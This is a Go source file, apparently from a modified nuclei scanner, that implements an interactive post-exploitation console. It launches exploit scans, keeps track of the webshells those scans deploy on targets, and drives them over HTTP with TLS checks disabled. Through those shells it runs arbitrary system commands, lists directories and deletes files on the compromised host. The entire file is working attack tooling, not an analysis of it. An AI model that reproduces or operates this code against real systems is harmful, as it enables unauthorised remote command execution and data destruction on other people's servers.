// Package console implements an interactive post-exploitation REPL: run
// scans, list the webshells they deployed and drive them (exec/ls/rm)
// without leaving the session.
package console

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/projectdiscovery/goflags"
	"github.com/projectdiscovery/nuclei/v3/internal/runner"
	"github.com/projectdiscovery/nuclei/v3/pkg/postexploit"
	"github.com/projectdiscovery/nuclei/v3/pkg/types"
)

// Console is the interactive session state.
type Console struct {
	base   *types.Options
	shells []postexploit.DeployedShell
	sel    int
	client *http.Client
	in     *bufio.Scanner
	out    io.Writer
}

// New creates a console over the base options (defaults for scans started
// from the prompt).
func New(base *types.Options) *Console {
	return &Console{
		base: base,
		sel:  -1,
		client: &http.Client{
			Timeout:   30 * time.Second,
			Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
		},
		in:  bufio.NewScanner(os.Stdin),
		out: os.Stdout,
	}
}

// Loop reads commands until EOF or "exit".
func (c *Console) Loop() {
	fmt.Fprintln(c.out, "nuclei console - type 'help' for commands, 'exit' to quit")
	for {
		prompt := "nuclei> "
		if c.sel >= 0 {
			prompt = fmt.Sprintf("nuclei[%d]> ", c.sel)
		}
		fmt.Fprint(c.out, prompt)
		if !c.in.Scan() {
			fmt.Fprintln(c.out)
			return
		}
		line := strings.TrimSpace(c.in.Text())
		if line == "" {
			continue
		}
		if !c.handle(line) {
			return
		}
	}
}

// handle executes one command line; returns false to end the session.
func (c *Console) handle(line string) bool {
	parts := strings.Fields(line)
	cmd, args := strings.ToLower(parts[0]), parts[1:]
	switch cmd {
	case "help", "?":
		c.help()
	case "exit", "quit":
		return false
	case "scan":
		c.scan(args)
	case "shells", "list":
		c.list()
	case "use":
		c.use(args)
	case "exec":
		c.exec(args)
	case "ls":
		c.ls(args)
	case "rm":
		c.rm(args)
	case "cleanup":
		c.cleanup()
	default:
		fmt.Fprintf(c.out, "unknown command %q (try 'help')\n", cmd)
	}
	return true
}

func (c *Console) help() {
	fmt.Fprint(c.out, `commands:
  scan <url> [-t templates] [-tags t] [-exploit] [-exploit-udf] [-webshell-clean] [-pscan] [-ps-ports p]
                                    run a scan; deployed shells are recorded
  shells                            list deployed webshells
  use <id>                          select a shell for exec/ls/rm/cleanup
  exec <command...>                 run a system command on the selected shell
  ls [path]                         list a directory on the target
  rm <path>                         delete a file on the target
  cleanup                           remove the selected webshell from the target
  help                              show this help
  exit                              leave the console
`)
}

// scan parses a scan command line into a fresh options copy and runs the
// nuclei engine once, then records any shells the exploit phase deployed.
func (c *Console) scan(args []string) {
	opts := *c.base
	opts.Console = false
	target := ""
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "-t", "-templates":
			if i+1 >= len(args) {
				fmt.Fprintln(c.out, "scan: -t requires a value")
				return
			}
			i++
			opts.Templates = goflags.StringSlice{args[i]}
		case "-tags":
			if i+1 >= len(args) {
				fmt.Fprintln(c.out, "scan: -tags requires a value")
				return
			}
			i++
			opts.Tags = goflags.StringSlice{args[i]}
		case "-ps-ports":
			if i+1 >= len(args) {
				fmt.Fprintln(c.out, "scan: -ps-ports requires a value")
				return
			}
			i++
			opts.PortScanPorts = goflags.StringSlice(strings.Split(args[i], ","))
		case "-exploit":
			opts.Exploit = true
		case "-exploit-udf":
			opts.ExploitUDF = true
		case "-webshell-clean":
			opts.WebShellClean = true
		case "-pscan":
			opts.PortScan = true
		default:
			if strings.HasPrefix(args[i], "-") {
				fmt.Fprintf(c.out, "scan: unknown flag %q (try 'help')\n", args[i])
				return
			}
			target = args[i]
		}
	}
	if target == "" {
		fmt.Fprintln(c.out, "usage: scan <url> [flags] (see 'help')")
		return
	}
	opts.Targets = goflags.StringSlice{target}

	r, err := runner.New(&opts)
	if err != nil {
		fmt.Fprintf(c.out, "scan: %v\n", err)
		return
	}
	if err := r.RunEnumeration(); err != nil {
		fmt.Fprintf(c.out, "scan: %v\n", err)
	}
	r.Close()

	if m := r.PostExploit(); m != nil {
		for _, sh := range m.Shells() {
			if c.sel < 0 {
				c.sel = len(c.shells)
			}
			c.shells = append(c.shells, sh)
			fmt.Fprintf(c.out, "shell %d: %s (%s, %s)\n", len(c.shells)-1, sh.URL, sh.Kind, sh.Severity)
		}
	}
}

func (c *Console) list() {
	if len(c.shells) == 0 {
		fmt.Fprintln(c.out, "no shells deployed yet (run 'scan <url> -exploit')")
		return
	}
	for i, sh := range c.shells {
		marker := " "
		if i == c.sel {
			marker = "*"
		}
		fmt.Fprintf(c.out, " %s %d  %-6s %-26s %s [%s]\n", marker, i, sh.Kind, sh.Name, sh.Source, sh.Severity)
	}
}

func (c *Console) use(args []string) {
	if len(args) != 1 {
		fmt.Fprintln(c.out, "usage: use <id>")
		return
	}
	id, err := strconv.Atoi(args[0])
	if err != nil || id < 0 || id >= len(c.shells) {
		fmt.Fprintf(c.out, "use: no shell %s\n", args[0])
		return
	}
	c.sel = id
}

// selected returns the currently selected shell.
func (c *Console) selected() (postexploit.DeployedShell, bool) {
	if c.sel < 0 || c.sel >= len(c.shells) {
		fmt.Fprintln(c.out, "no shell selected (use 'shells' and 'use <id>')")
		return postexploit.DeployedShell{}, false
	}
	return c.shells[c.sel], true
}

func (c *Console) exec(args []string) {
	sh, ok := c.selected()
	if !ok {
		return
	}
	if len(args) == 0 {
		fmt.Fprintln(c.out, "usage: exec <command...>")
		return
	}
	body := c.fetch(sh.URL + "&a=cmd&plain=1&c=" + url.QueryEscape(strings.Join(args, " ")))
	fmt.Fprintln(c.out, strings.TrimRight(body, "\n"))
}

func (c *Console) ls(args []string) {
	sh, ok := c.selected()
	if !ok {
		return
	}
	target := sh.URL + "&a=ls&plain=1"
	if len(args) > 0 {
		target += "&d=" + url.QueryEscape(args[0])
	}
	body := c.fetch(target)
	fmt.Fprint(c.out, body)
}

func (c *Console) rm(args []string) {
	sh, ok := c.selected()
	if !ok {
		return
	}
	if len(args) != 1 {
		fmt.Fprintln(c.out, "usage: rm <path>")
		return
	}
	fmt.Fprint(c.out, c.fetch(sh.URL+"&a=rm&plain=1&f="+url.QueryEscape(args[0])))
}

// cleanup removes the selected webshell itself and drops it from the list.
func (c *Console) cleanup() {
	sh, ok := c.selected()
	if !ok {
		return
	}
	fmt.Fprint(c.out, c.fetch(sh.URL+"&a=rm&plain=1&f="+url.QueryEscape(sh.Name)))
	c.shells = append(c.shells[:c.sel], c.shells[c.sel+1:]...)
	c.sel = -1
}

// fetch GETs a URL and returns the body (or the error text).
func (c *Console) fetch(rawURL string) string {
	resp, err := c.client.Get(rawURL)
	if err != nil {
		return fmt.Sprintf("error: %v\n", err)
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if err != nil {
		return fmt.Sprintf("error: %v\n", err)
	}
	if resp.StatusCode == http.StatusNotFound {
		return "404 not found (wrong token or shell removed?)\n"
	}
	return string(body)
}
